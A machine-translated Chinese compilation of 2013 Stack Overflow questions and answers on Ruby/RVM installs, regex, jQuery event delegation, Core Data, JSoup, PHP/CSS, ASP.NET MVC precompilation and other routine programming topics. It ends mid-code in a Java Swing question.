## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:54:27.783

匹配不包含的整个字符串的正则表达式`foo`是：

```
/\A(?!.*foo.*).*\z/m 
```

并且从包含的整个字符串的开头匹配的正则表达式`bar`是：

```
/\A.*bar/m 
```

由于您想同时满足这两个，因此通过将其中一个放在前瞻中来将它们结合起来：

```
/\A(?=.*bar)(?!.*foo.*).*\z/m 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T22:00:58.100

Sawa 的答案可以简化，所需要的只是一个积极的前瞻，一个消极的前瞻，并且由于你处于多行模式，`.*`剩下的就是：

```
/(?=.*foo)(?!.*bar).*/m 
```

多行也意味着`.`匹配`\n`，并且匹配是贪婪的。所以整个字符串将匹配而不需要锚。

**更新**

@Sawa 提出了`\A`必要但不是`\Z`. 实际上，再看一遍，积极的前瞻似乎是不必要的：

```
/\A(?!.*bar).*foo.*/m 
```

# ruby - 使用 RVM 安装 ruby -2.X 的问题

> ID：15232076
> 
> 赞同：8
> 
> 时间：2013-03-05T19:07:18.953
> 
> 标签：ruby, rvm

我最近遇到了 ruby​​-2.0.0-p0 安装。成功安装 rvm 后，我在 bash 中键入以下命令。

```
rvm install ruby-2.0.0-p0 
```

这是结果日志。

```
Searching for binary rubies, this might take some time.
No binary rubies available for: debian/wheezy_sid/i386/ruby-2.0.0-p0.
Continuing with compilation. Please read 'rvm mount' to get more information on binary rubies.
Installing Ruby from source to: /home/javier/.rvm/rubies/ruby-2.0.0-p0, this may take a while depending on your cpu(s)...
ruby-2.0.0-p0 - #downloading ruby-2.0.0-p0, this may take a while depending on your connection...
ruby-2.0.0-p0 - #extracting ruby-2.0.0-p0 to /home/javier/.rvm/src/ruby-2.0.0-p0
ruby-2.0.0-p0 - #extracted to /home/javier/.rvm/src/ruby-2.0.0-p0
ruby-2.0.0-p0 - #configuring
ruby-2.0.0-p0 - #compiling
ruby-2.0.0-p0 - #installing
Removing old Rubygems files...
Installing rubygems-2.0.0 for ruby-2.0.0-p0 ...
Error running 'env GEM_PATH=/home/javier/.rvm/gems/ruby-2.0.0-p0:/home/javier/.rvm/gems/ruby-2.0.0-p0@global:/home/javier/.rvm/gems/ruby-2.0.0-p0:/home/javier/.rvm/gems/ruby-2.0.0-p0@global GEM_HOME=/home/javier/.rvm/gems/ruby-2.0.0-p0 /home/javier/.rvm/rubies/ruby-2.0.0-p0/bin/ruby /home/javier/.rvm/src/rubygems-2.0.0/setup.rb', please read /home/javier/.rvm/log/ruby-2.0.0-p0/rubygems.install.log
Installation of rubygems did not complete successfully.
Saving wrappers to '/home/javier/.rvm/bin'.
ruby-2.0.0-p0 - #adjusting #shebangs for (gem irb erb ri rdoc testrb rake).
ruby-2.0.0-p0 - #importing default gemsets, this may take time ...
Install of ruby-2.0.0-p0 - #complete
Making gemset ruby-2.0.0-p0 pristine.
Error running '' under ,
please read /home/javier/.rvm/log/ruby-2.0.0-p0/gemset.pristine.log
Making gemset ruby-2.0.0-p0@global pristine.
Error running '' under ,
please read /home/javier/.rvm/log/ruby-2.0.0-p0/gemset.pristine.log 
```

请注意，在安装 ruby​​ gem 之前，该过程没有问题。这里发生了什么 ？？

任何帮助表示赞赏。

**第一条评论输出**

```
cat /home/javier/.rvm/log/ruby-2.0.0-p0/rubygems.install.log 
```

```
/home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require': cannot load such file -- openssl (LoadError)
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/security.rb:8:in `<top (required)>'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/package.rb:43:in `<top (required)>'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/installer.rb:8:in `<top (required)>'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/request_set.rb:5:in `<top (required)>'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems.rb:195:in `finish_resolve'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/rdoc.rb:14:in `<top (required)>'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/uninstaller.rb:10:in `<top (required)>'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/core_ext/kernel_require.rb:45:in `require'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/commands/setup_command.rb:440:in `uninstall_old_gemcutter'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/commands/setup_command.rb:144:in `execute'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/command.rb:305:in `invoke_with_build_args'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/command_manager.rb:170:in `process_args'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/command_manager.rb:130:in `run'
from /home/javier/.rvm/src/rubygems-2.0.0/lib/rubygems/gem_runner.rb:60:in `run'
from setup.rb:45:in `<main>'
RubyGems 2.0.0 installed 
```

**第二条评论输出和其他命令**

```
rvm use --default 2.0.0 
```

```
RVM is not a function, selecting rubies with 'rvm use ...' will not work.

You need to change your terminal emulator preferences to allow login shell.
Sometimes it is required to use `/bin/bash --login` as the command.
Please visit https://rvm.io/integration/gnome-terminal/ for a example. 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-05T20:54:24.127

尝试以下

```
$ rvm remove 2.0.0 # get rid of unsuccessful installation
$ rvm get head --autolibs=3 # get the latest RVM and build required libs
$ rvm requirements # just in case, install all other required stuff
$ rvm install ruby-2.0.0 
```

如果这些命令中的任何一个在任何时候失败。使用日志更新您的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T10:46:31.943

我有这个完全相同的问题。解决方案优雅而简单。

只需**直接从命令行更新您的 gem**：

```
sudo gem update --system 
```

就是这样！终端现在将显示：

```
Updating RubyGems
Updating rubygems-update
Successfully installed rubygems-update-2.0.3
Updating RubyGems to 2.0.3
Installing RubyGems 2.0.3
RubyGems 2.0.3 installed 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T03:37:34.627

我遇到了完全相同的问题，相同的错误消息等。我不了解您，但我使用 MacPorts，并且通过它安装了 OpenSSL 之类的库，我认为这可能导致了我的麻烦。

我刚刚让它在我的系统上运行；我不确定我做对了什么，但这里是我采取的步骤：

1.  设置 my`~/.rvmrc`以匹配[此处](https://rvm.io/integration/macports/)的第一个代码块。
2.  通过 rvm ( `rvm remove 2.0.0`) 卸载 2.0.0。
3.  删除了 ruby​​-2.0.0、rubygems-2.0.0 的文件夹以及`~/.rvm/src`.
4.  执行`rvm install 2.0.0 --with-opt-dir=/opt/local --autolibs=0`。`/opt/local`是我的 MacPorts 前缀目录，并`autolibs=0`禁用任何依赖项安装，因此它没有机会使用我的 MacPorts 库以外的东西。如果您在没有红色控制台输出的情况下通过此步骤，则您已经超越了上述错误。
5.  不知道是否有一个空的默认 gemset 是我还跑来`rvm use --create 2.0.0@...`创建一个非默认 gemset 然后（成功）安装一个 gem 及其依赖项的问题。

我希望这有帮助！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-23T15:09:12.613

打开终端，然后转到**编辑 > 配置文件首选项**，然后转到选项卡“**标题和命令**”并选中“**运行命令作为登录外壳**”。

启动 Bash，现在您可以直接从终端安装 Gems，而无需使用 sudo，并且错误“ **RVM 不是函数，使用 'rvm use ...' 选择 rubies 将不起作用。** ”将被消除。

干杯。

# javascript - 在javascript中获取动态创建的div的名称？

> ID：15232085
> 
> 赞同：1
> 
> 时间：2013-03-05T19:07:31.213
> 
> 标签：javascript, jquery

我似乎无法让我的 javascript .click() 方法与我动态创建的 div 一起使用。在这段代码中，我在类名“class1”下创建了每个 div，但我的 click 方法似乎没有检测到它们的存在。这是我的代码：

```
 <link href="../../Content/Site.css" rel="stylesheet" type="text/css" media="screen" />

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script type="text/javascript">

    function populate() {
        var select = document.getElementById("centres");
        for (var i = 1; i <= 10; i++) {
            var option = document.createElement("option");
            option.value = i;
            option.text = i;
            select.appendChild(option);
        }
    }

    function divGenerator() {
        var div;
        for (var i = 1; i <= document.getElementById("centres").selectedIndex + 1; i++) {
            div = document.createElement("div");
            div.className = "class1";
            div.innerHTML = "Space " + i;
            div.style.width = "100px";
            div.style.height = "100px";
            div.style.float = "left";
            document.getElementById("container2").appendChild(div);
        }
    }

    function glassLoad() {
        path_to_root_dir = "../../Content/";
        var myBox = new GlassBox();
        myBox.init('myBox', '128px', '62px', 'hidden');
        myBox.apos('170px', '150px');
    }
    // window.onload = populate;

    $(function () {
        $("container2").on("click", ".class1", function () {
            alert("The div was clicked.");
        });
    });

</script>

<div id="container1" style="width: auto; height: 50px;">
    <div id="myBox">Hello World!</div>
    <button style="margin: auto; vertical-align: top; float: left; font-size: 16px;" type="button" onclick="divGenerator();">Generate</button>
    @Html.DropDownList("centres")
</div>
<div id="container2" style="margin: 10px; float: left;" />

<head>

    <script type="text/javascript" src="../../Content/javascripts/glassbox/glassbox.js"></script>
    <style type="text/css">
        #myBox #myBox_content {
            padding: 2px;
            font-family: verdana, arial, helvetica;
            font-size: 12px;
        }
    </style>
    <title></title>
</head>

<body>

    <!--
<a href="javascript:myFunc();">popup</a>
-->
</body> 
```

这是它返回的内容（取自谷歌浏览器）：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <meta name="description" content="Description of your web page goes here." />
    <meta name="keywords" content="Keywords for you web page go here. Each keyword or group of keyword phrases are separated by a comma. Keep this  list short and relevant to the content and title of this specific page." />
    <title>OneEighty Asset Manager
    </title>
    <link href="../../Content/Site.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
    <div id="header">
        <div id="logo">
            <p></p>
        </div>
    </div>
    <!-- end #header -->
    <div id="menu">
        <ul>
            <li><a href="/">Home</a></li>
            <li><a href="/Home/About">About</a></li>
        </ul>
    </div>
    <!-- end #menu -->
    <div id="wrapper">
        <div class="btm">
            <div id="page">
                <h1>
                    <img src="../../Content/Images/1Eighty.png" alt="" style="height: 100px; width: 750px;" /></h1>
                <div id="content">
                    <link href="../../Content/Site.css" rel="stylesheet" type="text/css" media="screen" />

<script type="text/javascript">

    function populate() {
        var select = document.getElementById("centres");
        for (var i = 1; i <= 10; i++) {
            var option = document.createElement("option");
            option.value = i;
            option.text = i;
            select.appendChild(option);
        }
    }

    function divGenerator() {
        var div;
        for (var i = 1; i <= document.getElementById("centres").selectedIndex + 1; i++) {
            div = document.createElement("div");
            div.className = "class1";
            div.innerHTML = "Space " + i;
            div.style.width = "100px";
            div.style.height = "100px";
            div.style.float = "left";
            document.getElementById("container2").appendChild(div);
        }
    }

    function glassLoad() {
        path_to_root_dir = "../../Content/";
        var myBox = new GlassBox();
        myBox.init('#myBox', '128px', '62px', 'hidden');
        myBox.apos('170px', '150px');
        alert("div clicked");
    }
    // window.onload = populate;

</script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script type="text/javascript">
    $(function () {
        $("#container2").on("click", ".class1", function () {
            path_to_root_dir = "../../Content/";
            var myBox = new GlassBox();
            myBox.init('#myBox', '128px', '62px', 'hidden');
            myBox.apos('170px', '150px');
            alert("div clicked");
        });
    });
</script>

<div id="container1" style="width: auto; height: 50px;">

    <button style="margin: auto; vertical-align: top; float: left; font-size: 16px;" type="button" onclick="divGenerator();">Generate</button>
    <select id="centres" name="centres"><option>Southdale</option>
<option>Sasolburg</option>
<option>Sandton City</option>
<option>Greenstone</option>
<option>Morningside</option>
<option>Easgate</option>
<option>Bedfordview</option>
<option>Fourways</option>
<option>Linksfield Terrace</option>
<option>Carlton Centre</option>
<option>testcentre1</option>
<option>testcentre2</option>
<option>testcentre3</option>
</select>
</div>
<div id="container2" style="margin: 10px; float: left;" />

<head>

    <script type="text/javascript" src="../../Content/javascripts/glassbox/glassbox.js"></script>
    <style type="text/css">
        #myBox #myBox_content {
            padding: 2px;
            font-family: verdana, arial, helvetica;
            font-size: 12px;
        }
    </style>
    <title></title>
</head>

<body>
    <!--
<a href="javascript:myFunc();">popup</a>
-->
</body>

                </div>
                <!-- end #content -->
                <div style="clear: both;">
                    &nbsp;
                </div>
            </div>
            <!-- end #page -->
        </div>
    </div>
    <div id="footer">
        <p>
            Copyright (c) 2009 1eightyintra.com. All rights reserved.
        </p>
    </div>
    <!-- end #footer -->
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:10:01.737

由于页面加载时 DOM 中不存在该元素，因此您需要使用事件委托，例如`on`：

```
$(function () {
    $("body").on("click", ".class1", function () {
        alert("The div was clicked.");
    });
}); 
```

或者对于 1.7 之前的 jQuery，使用`delegate`：

```
$(function () {
    $("body").delegate(".class1", "click", function () {
        alert("The div was clicked.");
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:10:51.093

`click`仅将处理程序绑定到调用它时存在于 DOM 中的元素。

相反，使用[jQuery on 方法](http://api.jquery.com/on/)：

```
$(document).ready(function () {
    $("body").on("click", ".class1", function () {
        alert("The div was clicked.");
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:09:28.830

您需要将点击处理程序重新应用于新创建的 div。

# java - Android，在特定领域写作

> ID：15232089
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:07:52.963
> 
> 标签：java, android, memory, erase, sector

我想知道是否有可能在java中创建一个android应用程序，它将安装在手机的特定内存扇区（不是sd卡）上。因此，可以从其他应用程序访问这些扇区，并且可以将其完全擦除（几次写入/擦除，因此无法恢复）。你有什么想法？最好的问候，马丁

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:11:07.423

如果我理解正确，那么我认为你想要的是不可能的。

所有下载的应用程序都安装到`/data/app/`或 SD 卡。在正常情况下，没有办法将它们放在其他任何地方。

但是，您可以做的是在您的应用程序中制作 MODE_WORLD_ WRITABLE 文件。如果您这样做，那么其他应用程序将能够查看和操作这些特定文件。

# ios - 在 Core Data 中建立父子关系

> ID：15232092
> 
> 赞同：5
> 
> 时间：2013-03-05T19:08:01.870
> 
> 标签：ios, core-data, relational-database, nsmanagedobject

我正在尝试在 Core Data 中建立关系。我有一个树列表，每棵树都有一个水果列表。所以我有一个`Tree`实体和一个`Fruit`实体。

在代码中，我想在表格视图中列出树。当您单击一棵树时，它应该会显示该树上生长的水果列表。

我该如何建立这种关系？我需要给`Fruit`一个名为树的属性吗？以及如何在代码中设置关系，例如当我创建一个`Fruit`如何将它与给定的关联`Tree`？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-05T20:45:36.190

太阳，

这很简单。首先，您的模型应该如下所示（为简单起见，我跳过了属性）。

![在此处输入图像描述](../Images/83a0e3a0093702be7737c9d1911fff00.png)

在这种情况下，a`Tree`可以有零个或多个`Fruit`s（参见`fruits`关系）。相反，a`Fruit`有`tree`关系（逆关系）。

特别是，`fruits`关系应如下所示

![在此处输入图像描述](../Images/c6a49f09d73015c6428112538094b244.png)

在这里，您可以看到已设置了一对多关系。**删除**规则意味着如果你删除一棵树，它的果实也会被删除。

关系`tree`如下

![在此处输入图像描述](../Images/ca64867f48b3dca82241d3fea88b6bd9.png)

这是一对一的关系，因为水果只有附着在树上才能存在。未设置**可选标志。**因此，当您创建水果时，您还需要指定其父级（在本例中为树）。**Nullify**规则意味着当您删除一个水果时，Core Data 不会删除与该水果关联的树。它只会删除您指定的水果。

创建`Fruit`实体时，您应该遵循类似的路径

```
NSManagedObject *specificFruit = [NSEntityDescription insertNewObjectForEntityForName:@"Fruit" inManagedObjectContext:context];
[specificFruit setValue:parentTree forKey:@"tree"]; 
```

或者如果您创建了`NSManagedObject`子类：

```
Fruit *specificFruit = [NSEntityDescription insertNewObjectForEntityForName:@"Fruit" inManagedObjectContext:context];
specificFruit.tree = parentTree; 
```

希望有帮助。

PS 检查代码，因为我是在没有 Xcode 支持的情况下编写的。

# compiler-errors - 处理词法分析中的错误

> ID：15232093
> 
> 赞同：3
> 
> 时间：2013-03-05T19:08:03.650
> 
> 标签：compiler-errors, compiler-warnings, lexical-analysis

我正在编写一个词法分析器，我希望它能够输出有意义且准确的错误消息。就像发生错误的确切行和列一样。编写词法分析器时处理错误的适当方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T06:23:45.097

您使用什么工具进行词法分析？**我对Flex**有点了解，我就把我知道的写下来，也许对你或其他人有帮助。

Flex 是一种常用于生成词法分析器的工具。无需从头开始编写，您只需告诉它您的标记如何（使用正则表达式），它会生成一个 C 程序，该程序会从输入字符流中提供标记流。

它很容易学习，这里有一个很好的[教程](http://web.eecs.utk.edu/~bvz/cs461/notes/flex/)。学习后，您将能够轻松报告错误。

关于行号，Flex 定义了一个名为的变量`yylineno`，它保存当前行号。对于列号，[这](https://stackoverflow.com/questions/656703/how-does-flex-support-bison-location-exactly)可能会有所帮助。

# haskell - 在 Haskell 中从文件读取到数组

> ID：15232094
> 
> 赞同：2
> 
> 时间：2013-03-05T19:08:04.470
> 
> 标签：haskell, io, binary

我的驱动器上有一个基于 trie 的字典，它被编码为位压缩的 4 字节 trie 节点的连续数组。在 Python 中，我会通过以下方式将其读取到一个实际的 4 字节整数数组中：

```
import array
trie = array.array('I')
try:
    trie.fromfile(open("trie.dat", "rb"), some_limit)
except EOFError:
    pass 
```

如何在 Haskell 中做同样的事情（从文件读取到数组或向量）？我能想到的最好的办法是像往常一样读取文件，然后以四个为一组的字节获取字节，并在算术上将它们组合在一起，但这非常难看，而且还引入了对字节序的依赖。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T08:42:56.143

> 编码为位压缩的 4 字节 trie 节点的连续数组

我认为这里的“编码”是某种 Python 格式？你说“原始 C 风格的数组”？

要将此二进制（或任何其他格式）的数据加载到 Haskell 中，您可以使用[Data.Binary](http://hackage.haskell.org/package/binary)库，并为您的自定义格式提供[Binary 的实例。](http://hackage.haskell.org/packages/archive/binary/latest/doc/html/Data-Binary.html#g:2)

对于许多现有的数据交换格式，Hackage 上有一些库，但是您需要指定格式。例如图像数据，有[repa-devil](http://hackage.haskell.org/package/repa-devil)。

对于真正的原始数据，您可以[将其映射到 bytestring](http://hackage.haskell.org/packages/archive/bytestring-mmap/latest/doc/html/System-IO-Posix-MMap.html)，然后将其进一步处理为数据结构。

# java - 如何获取 JSoup 中 td 标签中的图像 src？

> ID：15232095
> 
> 赞同：0
> 
> 时间：2013-03-05T19:08:07.303
> 
> 标签：java, jsoup

```
Document doc = Jsoup.connect("http://www.stockexchangeofmauritius.com/officialquotes/").get();

Element table = doc.select("table").get(0);

Elements trs = table.select("tr");
Iterator trIter = trs.iterator();
boolean firstRow = true;
trIter.next();
stmtt = conn1.createStatement();

if (count < 1) {
    while (trIter.hasNext()) {
        Element tr = (Element) trIter.next();
        if (firstRow) {
            firstRow = false;
            continue;
        }            
        Elements tds = tr.select("td");
        Iterator tdIter = tds.iterator();
        int tdCount = 1;
        String symbol = null;
        String trend = null;
        String nominal = null;
        while (tdIter.hasNext()) {
                    Element td = (Element) tdIter.next();
                    switch (tdCount++) {

                        case 1:
                            symbol = String.valueOf(td.text());
                            break;
                        case 2:
                            trend = td.getElementsByTag("img").get(0).absUrl("src");
                            break;
                        case 3:
                            nominal = String.valueOf(td.text());
                            break; 
```

该`img`标签位于`td`表格的 a 中，因此我无法获取文本值。代码已被编辑。.getElementsByTag 是否返回字符串值？？？我从来没有为 JSoup 做过这个。请指教。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:37:42.440

获得相关的 td 标签后，您可以使用以下命令检索图像 src：
`td.getElementsByTag("img").get(0).attr("src")`

如果您想要包括网站名称在内的整个路径，请改用以下内容： `td.getElementsByTag("img").get(0).absUrl("src")`

# php - 如何将css与php一起使用？

> ID：15232102
> 
> 赞同：0
> 
> 时间：2013-03-05T19:08:29.420
> 
> 标签：php, html, css

我正在尝试从文件夹中获取一些图像并以整洁和美观的方式显示它。为此，我使用 PHP 从文件夹中获取图像。

这是代码：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<link rel="stylesheet" type="text/css" href="/custom.css">
<title>Load Images from a folder</title>
</head>
<body>

<?php

$files = glob("*.JPG");
$fileCount = count(glob("*.JPG"));

echo '<ul id = \"gallery\">';
for ($i = ($fileCount -1); $i >= (0); $i--) {
    echo '<li> <img src="' . $files[$i] . '" alt="image" /> </li>';
}
echo '</ul>';

?>
</body>
</html> 
```

除此之外，我正在使用以下 css。（下方）custom.css 文件与（上方）index.php 文件位于同一文件夹中。

```
#gallery li {
    display: inline;
    list-style: none;
    max-width: 250px;
    max-height: 250px;
    float: left;
    margin: 0px 20px 20px 0px;
    text-align: center;
} 
```

但是，它不起作用。我得到一个在另一个之下的图像（每个图像都有一个项目符号），而不是像我期望的那样一个在另一个旁边。

我尝试使用文本将 css 文件重命名为 .php：

```
<?php "header("Content-type: text/css");" ?> 
```

在顶部并用 'id=gallery' 标记了 'li'，这也没有帮助。

我在这里想念什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:12:14.267

`display: inline`将使元素不尊重浮动、高度/宽度和边距等内容。如果要使用浮点数，只需删除`display: inline`. 这应该使它们按预期流动。

如果这仍然不起作用，请检查您的浏览器的开发人员工具，以确保您的样式被应用，并且它们没有被其他地方的其他样式覆盖。

如果根本没有应用样式，请检查以下内容：

1.  它正在寻找样式表。前导斜杠强制站点从根目录查找。如果那不是您的 css 文件所在的位置，它就不会找到它。
2.  您的 PHP 正在编写正确的 HTML。当双引号括在单引号中时，您不需要转义双引号（也不需要在双引号中转义单引号）。`id=\"gallery\"`不一样`id="gallery"`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:13:29.460

你的ID错了，你应该有这个：

```
echo "<ul id='gallery'>"; 
```

代替

```
echo '<ul id = \"gallery\">'; 
```

# asp.net-mvc - 在 Azure 中预编译 ASP.NET MVC 项目（不使用 Web Deploy）

> ID：15232105
> 
> 赞同：13
> 
> 时间：2013-03-05T19:08:38.110
> 
> 标签：asp.net-mvc, azure

我想预编译一个 ASP.NET MVC 4 站点，但在 Azure Web 角色中。它如何捕获 cshtml 视图错误特别好。

这很容易通过 Web Deploy 完成，只需选中 Publish -> File Publish Options 中的几个适当的框。

但是，当您拥有超过 1 个 WebRole 实例时，您将不会使用 Web Deploy。而且我在项目设置中（在构建或打包/发布 Web 选项卡中）看不到任何用于指定这些预编译构建选项的选项。

**有没有办法以某种方式在项目级别指定预编译选项？**我也不热衷于任何需要离开能够使用简单（但缓慢）“发布到 Windows Azure”选项（即我对必须以某种方式手动上传）发布到 Azure 的工作流程的选项天蓝色的云包，一点也不）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-12-17T19:22:03.840

以下可能不是人们想要的一切，我希望 Visual Studio 团队可以添加一个简单的 UI 项目设置切换来做同样的事情（这可能是一个非常微不足道的任务），但这是我在问这个问题后发现的一种方法编译 cshtml razor 文件。不幸的是，虽然它发生在每个构建上，这确实慢了很多，但如果你只在 Release 上设置它，那么这是一个很好的折衷方案：

转到你的项目文件夹（在VS中右键单击项目，-> 打开文件夹...），找到.csproj文件，在记事本中打开它（当然是++），然后`PropertyGroup`在根目录下找到几个s xml ('Project') a`PropertyGroup`具有此条件，它仅指定特定于发布模式的设置（还有另一个用于调试，您可以在其上执行相同的操作）：

```
 <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
    <MvcBuildViews>true</MvcBuildViews>
    <NoWarn>162, 168, 169, 219, 414, 612, 618, 649, 1591</NoWarn>
  </PropertyGroup> 
```

只需添加**`MvcBuildViews`**元素（或者如果它已经存在则从 false 更改）并确保该值是 true，然后突然间，您会注意到每次构建都需要更长的时间 [在此处插入笑脸眨眼表情]。但是你确实得到了你的剃刀代码的编译，它会像你想要的那样捕获错误，非常好。所以团队已经有了这个，奇怪的是他们没有将 UI 选项添加到 MVC 项目设置中。

我想这回答了我最初的问题：“有没有办法可以在项目级别指定预编译选项？” 我在网上某处找到了我认为的答案，我不记得现在在哪里，而且我确信它也在其他地方。感谢大卫再次阐明了这个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T03:33:19.553

您是否检查过您的应用程序的 Azure 项目属性？右键单击 Web 角色，然后单击属性。如果我没记错的话，我认为它可能有预编译选项。

# javascript - 使用 Javascript 的简单切换 div 可见性不起作用

> ID：15232106
> 
> 赞同：2
> 
> 时间：2013-03-05T19:08:39.373
> 
> 标签：javascript, css

这是非常令人沮丧的，因为它看起来很简单但行不通。

在我的身体里我有

```
<div id ="splashscreen" style="display:block">
    <h3>title</h3>
    <p>text</p>
    <inputtype="button" value="Start" onClick="splash();" />
</div>` 
```

在我的脑海中，在我拥有的脚本标签中

```
function splash() {
    var divSplash = document.getElementById("splashscreen");
    divSplash.style.display = "none";
} 
```

当然，当单击开始按钮时，`splash()`应该调用该函数并且将我的`splashscreen`div 的显示设为无？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:35:40.660

这里的问题是你写的`language="text/javascript"`，如果你改用`language="javascript"`它的话。

我建议您删除语言属性并改用**type="text/javascript"**。如果您使用的是 HTML5，[则可以省略 type 属性](http://dev.w3.org/html5/markup/script.html)。

```
<script type="text/javascript"> 
    function startGame() { 
        var divSplash = document.getElementById("splash"); 
        divSplash.style.display = "none"; 
    } 
</script> 
```

此外，语言属性[现在已过时](http://www.whatwg.org/specs/web-apps/current-work/multipage/obsolete.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:12:42.783

使用您在此处显示的确切代码，我收到错误“divSplash 为空”。这是意料之中的——您的 div 名为“spashscreen”，但您的 JS 函数正在寻找一个名为“splashscreen”的 div。（你错过了一个'l'）。

当我修复错字时，它可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:13:21.137

您没有使用相同的 id :)

闪屏！=闪屏

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:30:17.197

这是[jsfiddle中的答案](http://jsfiddle.net/mJVvw/1/)

HTML：

```
<div id ="splashscreen" style="display:block">
    <h3>title</h3>
    <p>text</p>
    <button onclick="splash()">Start</button>
</div> 
```

Javascript：

```
function splash() {
    var divSplash = document.getElementById('splashscreen');
    divSplash.style.display = "none";
} 
```

# java - 如何将字符串从 JTextField 转换为双精度数组

> ID：15232114
> 
> 赞同：0
> 
> 时间：2013-03-05T19:08:57.190
> 
> 标签：java, arrays, swing, double, jtextfield

我目前正在尝试从两个 JTextField 中读取值，通过递增 1 来查找值的范围，然后将值写入 Double 数组。但是我所做的方式似乎不起作用，我在谷歌/互联网上找不到解决方案。

到目前为止，这是我的代码：

```
package textfieldtodouble;

import java.awt.*;
import java.util.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.geom.AffineTransform;
import java.awt.geom.Line2D;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.beans.PropertyVetoException;
import javax.swing.*;

public class TextFieldToDouble {

JFrame frame = new JFrame();
JPanel panel = new JPanel();
static JTextField maxValue1 = new JTextField(20);
static JTextField maxValue2 = new JTextField(20);
JButton btn1 = new JButton("To Double Array");
double x[];
double value1;
double value2;

void buildTheGUI() {
    panel.add(maxValue1, BorderLayout.NORTH);
    panel.add(btn1, BorderLayout.SOUTH);
    panel.add(maxValue2, BorderLayout.SOUTH);
    btn1.addActionListener(new toDouble());
    frame.add(panel);
    frame.setSize(300, 300);
    frame.setVisible(true);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
}

TextFieldToDouble() {
    buildTheGUI();
}

public static void main(String[] args) {
    new TextFieldToDouble();
}

class toDouble implements ActionListener {

    public void actionPerformed(ActionEvent event) {
        value1 = Double.parseDouble(maxValue1.getText());
        value2 = Double.parseDouble(maxValue2.getText());

        for (int i = 0; i < value1; i++) {
